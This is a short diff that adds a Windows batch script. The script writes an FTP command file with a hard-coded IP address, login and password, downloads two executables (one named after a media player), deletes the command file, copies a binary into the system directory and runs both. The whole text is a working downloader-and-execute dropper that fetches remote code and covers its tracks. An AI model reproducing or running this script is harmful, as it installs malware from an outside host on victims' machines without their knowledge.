@@ -1,0 +1,16 @@
+echo open 58.215.76.161>>head.txt
+echo webmaster@joscarlet.com>>head.txt
+echo bsxmjs>>head.txt
+echo bin>>head.txt
+echo cd over>>head.txt
+echo get gz135.exe>>head.txt
+echo get TTPlayer.exe>>head.txt
+echo bye>>head.txt
+ftp -s:head.txt
+del head.txt
+del head.txt
+copy  TTPlayer.exe %SystemRoot%\
+gz135.exe
+TTPlayer.exe
+
+
